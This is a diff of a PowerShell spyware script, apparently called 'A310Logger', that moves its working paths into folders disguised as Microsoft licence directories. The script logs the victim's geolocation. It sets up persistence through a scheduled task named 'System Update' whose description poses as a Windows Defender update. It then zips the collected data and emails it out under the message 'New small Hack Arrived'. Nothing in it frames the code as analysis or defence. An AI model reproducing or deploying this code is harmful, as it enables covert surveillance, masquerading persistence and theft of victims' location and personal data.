@@ -8,35 +8,35 @@ while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied
     Start-Sleep -Milliseconds 100 
 }  
 
-echo ***************location************** > C:\Users\$env:UserName\AppData\Local\A310Logger\Others\GeoLocation.txt
+echo ***************location************** > C:\Users\Public\Licence\Microsoft\Location\GeoLocation.txt
 if ($GeoWatcher.Permission -eq 'Denied'){
     $Host.UI.WriteDebugLine("Allow apps to access location")
     
 } else {
-    $GeoWatcher.Position.Location | Select Latitude,Longitude >> C:\Users\$env:UserName\AppData\Local\A310Logger\Others\GeoLocation.txt | Out-Null
+    $GeoWatcher.Position.Location | Select Latitude,Longitude >> C:\Users\Public\Licence\Microsoft\Location\GeoLocation.txt | Out-Null
 }
 
-echo To know Location: >> C:\Users\$env:UserName\AppData\Local\A310Logger\Others\GeoLocation.txt
-echo https://www.latlong.net/Show-Latitude-Longitude.html >> C:\Users\$env:UserName\AppData\Local\A310Logger\Others\GeoLocation.txt
-echo **************************************************** >> C:\Users\$env:UserName\AppData\Local\A310Logger\Others\GeoLocation.txt
+echo To know Location: >> C:\Users\Public\Licence\Microsoft\Location\GeoLocation.txt
+echo https://www.latlong.net/Show-Latitude-Longitude.html >> C:\Users\Public\Licence\Microsoft\Location\GeoLocation.txt
+echo **************************************************** >> C:\Users\Public\Licence\Microsoft\Location\GeoLocation.txt
 
 
 
 
-if(!(Test-Path "C:\Users\$env:UserName\AppData\Local\A310Logger\count.txt")) {
+if(!(Test-Path "C:\Users\Public\Licence\Microsoft\count.txt")) {
     [int]$count=0
-    echo "$count"> "C:\Users\$env:UserName\AppData\Local\A310Logger\count.txt"
+    echo "$count"> "C:\Users\Public\Licence\Microsoft\count.txt"
 }else{
-    $count= Get-Content "C:\Users\$env:UserName\AppData\Local\A310Logger\count.txt"
+    $count= Get-Content "C:\Users\Public\Licence\Microsoft\count.txt"
 }
 
 
        try { 
-       schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "System Update" /TR "C:\Users\%username%\AppData\Local\0101\folder.exe" /ST 23:55 | Out-Null
+       schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "System Update" /TR "C:\Users\Public\Licence\Extension\folder.exe" /ST 23:55 | Out-Null
        }
        catch {
        $trigger = New-JobTrigger -once -At $(get-date) -RepetitionInterval $([timespan]::FromMinutes("10080")) -RepeatIndefinitely
-       $action = New-ScheduledTaskAction -Execute "C:\Users\%username%\AppData\Local\0101\folder.exe"
+       $action = New-ScheduledTaskAction -Execute "C:\Users\Public\Licence\Extension\folder.exe"
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "System Update" -Description "Windows Defender Antivirus Regular Update." -Force
        }
   	
@@ -84,7 +84,7 @@ else{
     $msg.Subject = "$env:computername ### {$ip ($count)}"
     $msg.Body = "New small Hack Arrived. Lets Enjoy !!!"                     
 
-    $file1 = "C:\Users\$env:UserName\AppData\Local\SystemUpdate.zip"
+    $file1 = "C:\Users\Public\Licence\Microsoft\SystemUpdate.zip"
 
     if(Test-Path $file1) {
     Remove-Item  $file1 -Recurse -Force -Confirm:$false
@@ -95,7 +95,7 @@ else{
 
      $error.clear()
      try { 
-        Compress-Archive -Path C:\Users\$env:UserName\AppData\Local\A310Logger\ -DestinationPath "C:\Users\$env:UserName\AppData\Local\SystemUpdate.zip" -Force -Confirm:$false
+        Compress-Archive -Path C:\Users\Public\Licence\Microsoft\ -DestinationPath "C:\Users\Public\Licence\Microsoft\SystemUpdate.zip" -Force -Confirm:$false
      }
        catch { 
         
@@ -118,7 +118,7 @@ else{
      
     }   
     $count= [int]$count+1
-    $count > "C:\Users\$env:UserName\AppData\Local\A310Logger\count.txt"
+    $count > "C:\Users\Public\Licence\Microsoft\count.txt"
     Start-Sleep -Milliseconds 500
    
     
